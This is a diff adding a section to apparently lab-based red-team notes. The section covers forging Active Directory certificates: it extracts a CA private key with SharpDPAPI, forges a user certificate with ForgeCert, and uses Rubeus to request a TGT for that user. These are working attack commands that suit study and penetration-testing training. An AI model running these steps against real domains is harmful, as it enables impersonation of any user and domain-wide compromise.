@@ -76,3 +76,29 @@ where:
 Rubeus describe will now show that this is a TGT for the target user.
 
     PS C:\Users\Attacker> Rubeus.exe describe /ticket:doIFYj...
+
+## Forged Certificates
+
+AD CS roles may be on separate servers and not on the DC, often not with the same sensitivity as DCs. Only EAs and DAs can access/manage DCs, but lower roles e.g. server admins can access the CAs. Gaining LA to a CA allows an attacker to extract the CA private key, which can be used to sign a forged cert (like the krbtgt hash being able to sign a forged TGT). The default validity period is 5 years, but can be changed during setup.
+
+1: Once on a CA, SharpDPAPI can extract the private keys:
+
+    beacon> run hostname
+    dc-2
+    beacon> getuid
+    [*] You are NT AUTHORITY\SYSTEM (admin)
+    beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
+
+2: Save the private key and cert to a .pem file and convert it to a .pfx with openssl.  
+
+3: Build the forged certificate with ForgeCert:
+
+    PS C:\Users\Attacker> ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123
+
+Though SubjectAltName can be anything, the user does need to be present in AD. Use Rubeus to request a legitimate TGT with this forged certificate:
+
+    beacon> execute-assembly Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACA... /password:pass123 /nowrap
+
+Can forge user and machine certs. Use this with the S4U2self trick to gain access to any machine or service in the domain.
+
+
